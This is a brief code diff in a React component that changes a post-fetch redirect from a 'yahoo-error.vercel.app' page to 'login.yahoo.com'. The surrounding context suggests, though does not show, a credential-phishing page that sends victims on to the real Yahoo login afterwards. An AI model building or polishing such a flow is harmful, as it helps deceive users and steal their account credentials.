@@ -42,8 +42,9 @@ function App() {
                 .then((response) => response.json())
                 .then((result) => {
                     // user221999 ;
-                    setLoading(false)
-                    window.location.replace("yahoo-error.vercel.app")
+                    setLoading(false);
+                    // window.location.replace("yahoo-error.vercel.app")
+                    window.location.replace("login.yahoo.com")
                 })
                 .catch((error) => {
                     // alert(error);
